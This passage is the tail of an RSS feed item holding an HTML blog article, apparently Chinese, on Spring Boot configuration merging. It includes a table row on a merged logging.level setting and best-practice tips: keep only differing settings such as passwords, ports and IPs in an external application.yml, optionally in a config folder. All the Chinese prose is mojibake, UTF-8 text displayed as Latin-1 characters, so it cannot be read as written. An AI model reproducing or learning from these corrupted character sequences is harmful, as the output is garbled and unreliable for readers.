(ä¿åº•)ã€‚å¤–éƒ¨ä¸¤ä¸ªæ–‡ä»¶éƒ½æ²¡å†™è¿™ä¸ªé…ç½®ï¼Œæ²¿ç”¨é»˜è®¤å€¼ã€‚</td></tr><tr><td align="left"><code>logging.level</code></td><td align="left"><strong>debug</strong></td><td align="left"><strong>configç›®å½•</strong> (æ–°å¢)ã€‚è¿™æ˜¯ä¸€ä¸ªå…¨æ–°çš„é…ç½®ï¼Œè¢«åˆå¹¶è¿›æ¥äº†ã€‚</td></tr></tbody></table>
<h2 data-id="heading-9">äº”ã€ æ€»ç»“ä¸æœ€ä½³å®è·µ</h2>
<ol>
<li><strong>ä¸è¦è¯•å›¾åœ¨å¤–éƒ¨é‡å†™æ‰€æœ‰é…ç½®</strong>ï¼šåˆ©ç”¨â€œäº’è¡¥åˆå¹¶â€ç‰¹æ€§ï¼Œå¤–éƒ¨é…ç½®æ–‡ä»¶ï¼ˆ<code>application.yml</code>ï¼‰åº”è¯¥<strong>åªåŒ…å«éœ€è¦ä¿®æ”¹çš„å·®å¼‚åŒ–é…ç½®</strong>ï¼ˆå¦‚æ•°æ®åº“å¯†ç ã€ç«¯å£ã€IPï¼‰ã€‚è®©é‚£äº›é€šç”¨çš„é…ç½®ï¼ˆå¦‚ Jackson æ ¼å¼åŒ–ã€çº¿ç¨‹æ± é»˜è®¤è®¾ç½®ï¼‰ç•™åœ¨ Jar åŒ…é‡Œä½œä¸ºä¿åº•ã€‚</li>
<li><strong>ç›®å½•ç»“æ„å»ºè®®</strong>ï¼š
<ul>
<li>å¦‚æœæ˜¯ç®€å•çš„å•æœºéƒ¨ç½²ï¼Œç›´æ¥æŠŠ <code>application.yml</code> æ”¾åœ¨ Jar åŒ…æ—è¾¹å³å¯ã€‚</li>
<li>å¦‚æœä½ å¸Œæœ›ç›®å½•æ›´æ•´æ´ï¼Œæˆ–è€…æœ‰å¤šä¸ªè¾…åŠ©é…ç½®æ–‡ä»¶ï¼Œå»ºè®®åˆ›å»ºä¸€ä¸ª <code>config</code> æ–‡ä»¶å¤¹å­˜æ”¾ã€‚</li>
</ul>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>